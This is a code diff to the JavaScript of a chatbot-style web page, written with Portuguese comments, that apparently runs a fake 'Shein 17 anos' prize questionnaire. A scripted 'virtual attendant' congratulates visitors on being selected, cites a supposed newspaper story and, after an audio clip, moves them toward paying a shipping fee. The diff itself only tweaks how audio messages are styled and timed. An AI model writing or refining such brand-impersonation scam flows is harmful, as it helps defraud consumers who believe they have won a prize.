@@ -47,8 +47,7 @@ async function consultarCepViaApi(cep) {
 
 // Fluxo de conversa (com placeholders dinâmicos)
 var conversationFlow = [
-  
-       { type: 'bot', delay: 1000, content: '<span class="bold">Parabéns!</span> Você foi selecionada para o questionário <span class="bold">Shein 17 anos</span>...' },
+         { type: 'bot', delay: 1000, content: '<span class="bold">Parabéns!</span> Você foi selecionada para o questionário <span class="bold">Shein 17 anos</span>...' },
   { type: 'bot', delay: 1500, content: 'Olá! Seja bem vinda ao <b>questionário premiado</b> em comemoração aos <b>17 anos da Shein!</b>' },
   { type: 'bot', delay: 1700, content: 'Sou a <b>Fernanda</b>, atendente virtual da <b>Shein</b> e vou te auxiliar no seu <b>questionário premiado!</b> 🥰' },
   { type: 'bot', delay: 1500, content: 'Antes de começarmos, veja a <b>matéria exclusiva</b> divulgada nos jornais sobre nosso questionário <b>premiado:</b>' },
@@ -366,10 +365,12 @@ var conversationFlow = [
       },
       // PASSO (Originalmente 67)
 
+
       {
         type: 'bot',
         delay: 1500,
-        content: '<audio controls src="images/audio.mp3" autoplay style=""></audio>', duration: 41000,
+        content: '<audio controls src="images/audio.mp3" autoplay style=""></audio>', 
+        duration: 41000,
         buttons: ['Porque preciso pagar o frete ?']
       },
       {
@@ -517,16 +518,30 @@ function addBotMessage(content, image = null, buttons = null, input = false, typ
   }
 
   const messageDiv = document.createElement('div');
-  // Verifica se o conteúdo é um link de frete (que deve ocupar a largura total e não ter bolha)
-  const isFullWidthLink = content?.includes('<a href=') && content?.includes('w-full');
+  // Verifica se o conteúdo é um link de frete (que deve ocupar a largura total e não ter bolha) OU se é um áudio
+  const isFullWidthLink = (content?.includes('<a href=') && content?.includes('w-full')) || (content?.includes('<audio') && content?.includes('controls'));
 
-  // Se for um link de largura total, remove a classe 'bot' para evitar estilos de bolha
+  // Se for um link de largura total ou áudio, remove a classe 'bot' para evitar estilos de bolha
   messageDiv.className = isFullWidthLink ? 'message full-width-link' : 'message bot';
 
   // CORREÇÃO APLICADA AQUI: Permite que imagem e conteúdo coexistam na mesma bolha
   let imageHtml = image ? `<img src="${image}" alt="Imagem" style="max-width: 100%; height: auto; display: block; margin-bottom: 10px;">` : '';
   let contentHtml = content ? content : '';
   let bubbleContent = imageHtml + contentHtml;
+
+  // NOVO: Injeta a classe 'compact-audio-player' no elemento <audio> se ele existir
+  if (bubbleContent.includes('<audio') && bubbleContent.includes('controls')) {
+    // Usa uma expressão regular mais flexível para encontrar a tag <audio> com controls
+    bubbleContent = bubbleContent.replace(/<audio\s+([^>]*?)controls([^>]*?)>/i, (match, p1, p2) => {
+        // Verifica se já existe um atributo class
+        if (match.includes('class=')) {
+            return match.replace(/class=["']([^"']*)["']/, 'class="$1 compact-audio-player"');
+        } else {
+            // Adiciona o atributo class
+            return `<audio ${p1} controls class="compact-audio-player" ${p2}>`;
+        }
+    });
+  }
 
   // Se for um link de largura total, o HTML é simplificado para não incluir a bolha
   if (isFullWidthLink) {
@@ -548,7 +563,8 @@ function addBotMessage(content, image = null, buttons = null, input = false, typ
   if (buttons?.length) {
     // NOVO: Determina o delay para os botões. Se for áudio e tiver duration, usa a duration. Caso contrário, usa 300ms.
     let buttonDelay = 300;
-    if (content?.includes('<audio controls=') && duration) {
+    // NOVO: Usa a variável bubbleContent, que já tem a classe 'compact-audio-player' injetada
+    if (bubbleContent?.includes('compact-audio-player') && duration) {
         buttonDelay = duration;
     }
 
